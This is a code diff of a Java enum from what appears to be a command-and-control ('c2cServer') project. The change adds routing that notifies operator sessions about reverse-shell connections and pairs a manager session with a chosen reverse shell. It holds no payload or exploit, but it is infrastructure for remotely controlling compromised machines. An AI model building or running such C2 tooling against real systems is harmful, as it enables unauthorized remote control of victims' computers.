@@ -1,20 +1,16 @@
 package com.mtattab.c2cServer.model.enums;
 
-import com.fasterxml.jackson.core.JsonProcessingException;
-import com.fasterxml.jackson.databind.ObjectMapper;
+import com.mtattab.c2cServer.model.MessageEventModel;
 import com.mtattab.c2cServer.model.SocketCommunicationDTOModel;
 import com.mtattab.c2cServer.service.ActiveSessionEventHandler;
 import com.mtattab.c2cServer.util.DataManipulationUtil;
 import com.mtattab.c2cServer.util.SocketUtil;
 import lombok.Getter;
 import lombok.extern.slf4j.Slf4j;
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.stereotype.Component;
 import org.springframework.web.socket.TextMessage;
-import org.springframework.web.socket.WebSocketMessage;
 import org.springframework.web.socket.WebSocketSession;
 
-import java.io.IOException;
+import java.util.HashMap;
 import java.util.Objects;
 import java.util.Set;
 @Slf4j
@@ -22,9 +18,9 @@ import java.util.Set;
 public enum ActiveSessionsEvents {
     RECEIVED_NEW_CONNECTION("RECEIVED_NEW_CONNECTION", new ActiveSessionEventHandler() {
         @Override
-        public void handle(WebSocketSession session, Set<WebSocketSession> sessions) {
-            sessions.forEach(activeSession-> {
-                SocketUtil.sendMessage(activeSession,new TextMessage(constructJsonMessage(activeSession,RECEIVED_NEW_CONNECTION.getValue())));
+        public void handle(MessageEventModel reverseShellSession, Set<WebSocketSession> mangerSessions, HashMap<WebSocketSession, WebSocketSession> sessionsToBeConnected) {
+            mangerSessions.forEach(activeSession-> {
+                SocketUtil.sendMessage(activeSession,new TextMessage(constructJsonMessage(reverseShellSession.getSession(),RECEIVED_NEW_CONNECTION.getValue())));
             });
             log.info("[+] {} handled",RECEIVED_NEW_CONNECTION.getValue());
 
@@ -32,14 +28,27 @@ public enum ActiveSessionsEvents {
     }),
     LOST_CONNECTION("LOST_CONNECTION", new ActiveSessionEventHandler() {
         @Override
-        public void handle(WebSocketSession session, Set<WebSocketSession> sessions) {
-            sessions.forEach(activeSession-> {
-                SocketUtil.sendMessage(activeSession,new TextMessage(constructJsonMessage(activeSession, LOST_CONNECTION.getValue())));
+        public void handle(MessageEventModel reverseShellSession, Set<WebSocketSession> mangerSessions, HashMap<WebSocketSession, WebSocketSession> sessionsToBeConnected) {
+            mangerSessions.forEach(activeSession-> {
+                SocketUtil.sendMessage(activeSession,new TextMessage(constructJsonMessage(reverseShellSession.getSession(), LOST_CONNECTION.getValue())));
             });
             log.info("[+] {} handled", LOST_CONNECTION.getValue());
 
         }
-    });
+    }),
+    MANAGER_TO_REVERSE_SHELL_CONNECTION("MANAGER_TO_REVERSE_SHELL_CONNECTION", new ActiveSessionEventHandler() {
+        @Override
+        public void handle(MessageEventModel messageEventModel, Set<WebSocketSession> sessions, HashMap<WebSocketSession, WebSocketSession> sessionsToBeConnected) {
+
+            sessionsToBeConnected.put(messageEventModel.getSession(), messageEventModel.getTargetConnectSession());
+
+
+            log.info("[+] {} handled", MANAGER_TO_REVERSE_SHELL_CONNECTION.getValue());
+
+        }
+    })
+
+    ;
 
     private String value;
 
